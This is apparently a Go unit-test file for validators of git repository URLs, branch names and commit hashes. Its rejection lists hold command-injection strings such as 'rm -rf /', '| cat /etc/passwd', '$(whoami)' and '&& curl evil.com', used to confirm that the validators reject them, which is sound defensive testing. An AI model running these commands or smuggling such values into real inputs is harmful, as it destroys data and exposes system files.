package validator

import "testing"

func TestValidateRepositoryURL_Valid(t *testing.T) {
	valid := []string{
		"https://github.com/example/repo.git",
		"https://github.com/example/repo",
		"http://gitlab.com/org/project.git",
		"git@github.com:example/repo.git",
		"git@gitlab.com:org/sub-group/project.git",
	}
	for _, url := range valid {
		if err := ValidateRepositoryURL(url); err != nil {
			t.Errorf("ValidateRepositoryURL(%q) = %v, want nil", url, err)
		}
	}
}

func TestValidateRepositoryURL_Empty(t *testing.T) {
	if err := ValidateRepositoryURL(""); err == nil {
		t.Error("ValidateRepositoryURL(\"\") = nil, want error")
	}
}

func TestValidateRepositoryURL_ShellMetachars(t *testing.T) {
	malicious := []string{
		"https://example.com/repo.git; rm -rf /",
		"https://example.com/repo.git | cat /etc/passwd",
		"https://example.com/repo.git$(whoami)",
		"https://example.com/repo.git`id`",
		"https://example.com/repo.git && curl evil.com",
		"ftp://example.com/repo.git",
	}
	for _, url := range malicious {
		if err := ValidateRepositoryURL(url); err == nil {
			t.Errorf("ValidateRepositoryURL(%q) = nil, want error", url)
		}
	}
}

func TestValidateBranch_Valid(t *testing.T) {
	valid := []string{"main", "develop", "feature/my-feature", "release-1.0", "v1.2.3", "refs/heads/main"}
	for _, b := range valid {
		if err := ValidateBranch(b); err != nil {
			t.Errorf("ValidateBranch(%q) = %v, want nil", b, err)
		}
	}
}

func TestValidateBranch_Empty(t *testing.T) {
	if err := ValidateBranch(""); err != nil {
		t.Errorf("ValidateBranch(\"\") = %v, want nil", err)
	}
}

func TestValidateBranch_ShellMetachars(t *testing.T) {
	malicious := []string{
		"main; rm -rf /",
		"main | cat /etc/passwd",
		"main$(whoami)",
		"main`id`",
		"main && curl evil.com",
		"branch name with spaces",
	}
	for _, b := range malicious {
		if err := ValidateBranch(b); err == nil {
			t.Errorf("ValidateBranch(%q) = nil, want error", b)
		}
	}
}

func TestValidateCommit_Valid(t *testing.T) {
	valid := []string{
		"abc1234",
		"deadbeef",
		"abc1234567890abc1234567890abc1234567890a",
	}
	for _, c := range valid {
		if err := ValidateCommit(c); err != nil {
			t.Errorf("ValidateCommit(%q) = %v, want nil", c, err)
		}
	}
}

func TestValidateCommit_Empty(t *testing.T) {
	if err := ValidateCommit(""); err != nil {
		t.Errorf("ValidateCommit(\"\") = %v, want nil", err)
	}
}

func TestValidateCommit_Invalid(t *testing.T) {
	invalid := []string{
		"abc123",
		"not-a-sha",
		"abc1234; rm -rf /",
		"ZZZZZZZZZZ",
		"abc1234567890abc1234567890abc1234567890ab",
	}
	for _, c := range invalid {
		if err := ValidateCommit(c); err == nil {
			t.Errorf("ValidateCommit(%q) = nil, want error", c)
		}
	}
}
